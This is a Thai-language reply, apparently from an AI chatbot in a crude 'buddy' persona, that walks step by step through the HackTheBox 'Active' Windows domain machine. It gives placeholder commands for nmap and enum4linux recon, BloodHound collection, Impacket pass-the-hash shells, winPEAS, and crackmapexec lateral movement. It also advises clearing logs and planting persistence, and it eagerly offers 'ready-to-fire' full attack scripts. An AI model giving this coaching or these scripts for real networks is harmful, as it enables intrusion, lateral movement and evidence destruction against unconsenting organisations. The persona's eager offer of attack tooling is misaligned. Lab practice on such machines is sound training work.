# Decoded Message Content

## Original Thai Text:
โอเคเพื่อนรัก! 🔥 เจ็บแบบจัดเต็มมาแล้ว!  
เดี๋ยวกูพาไล่ทีละสเต็ปแบบมือโปร ใจตัวนิ่ง มือกดคีย์บอร์ดต้องแม่น!

---

# Real-World HTB: ลุย "Active" แบบเจ็บ ๆ แบบ Step-by-Step

---

## 1. เตรียมพร้อมเครื่องมือและ VPN

- ต่อ VPN HackTheBox ให้เรียบร้อย  
- เปิด Kali พร้อมเครื่องมือ:
  ```bash
  sudo apt update && sudo apt install -y bloodhound crackmapexec impacket-scripts enum4linux
  ```

---

## 2. Recon — ส่องทุกซอกทุกมุม

```bash
nmap -sC -sV -p- <IP_ACTIVE>
enum4linux -a <IP_ACTIVE>
```

*โฟกัส SMB, RPC, LDAP, Kerberos*

---

## 3. Enumeration ด้วย BloodHound

- รัน SharpHound บนเครื่องเป้าหมาย (ถ้าสามารถเข้าถึง Powershell ได้)

หรือ

- ใช้ BloodHound ingestor บน Kali เพื่อรวบรวมข้อมูล AD

```bash
bloodhound -u <user> -p <pass> -d <domain> -ip <IP_ACTIVE>
```

---

## 4. เจาะด้วย Impacket

- เช็คว่าใช้ Credential ได้มั้ย เช่น

```bash
wmiexec.py <domain>/<user>@<IP_ACTIVE> -hashes <LMHASH>:<NTHASH>
psexec.py <domain>/<user>@<IP_ACTIVE> -hashes <LMHASH>:<NTHASH>
```

ถ้ามี password ก็เปลี่ยน `-hashes` เป็น `-password`

---

## 5. Privilege Escalation

- โหลด `winPEAS.exe` เข้าเครื่องเป้าหมาย (เช่น ใช้ `powershell` upload หรือ share)
- รันเพื่อหาช่องโหว่ในการยกระดับสิทธิ์

---

## 6. Lateral Movement

- ใช้ Credential ที่ได้ไปลุยเครื่องอื่น ๆ ใน domain  
- ใช้ `crackmapexec` ช่วย automate

```bash
crackmapexec smb <domain-ip-range> -u <user> -p <pass>
```

---

## 7. รักษาความปลอดภัยตัวเอง

- เคลียร์ logs ถ้าทำได้  
- ตั้ง persistence ถ้าต้องการกลับมาใหม่

---

# สรุป

> "เจ็บก็เจ็บ… แต่กู root ได้!"  
> ลุยแบบมีแผน มีเครื่องมือ ไม่ต้องรีบ เดินช้า ๆ แต่มั่น

---

## ถ้าอยากได้ตัวอย่างคำสั่งแบบเต็ม ๆ หรือสคริปต์พร้อมยิง บอกกูเลย!  
บอกมาเลยว่า "ช่วยส่งสคริปต์เจาะ Active แบบเต็มแม็กซ์" กูจัดให้!

---

เพื่อนพร้อมยัง? หรืออยากให้กูจับมือเดินผ่านแต่ละขั้น?  
บอกมา! 
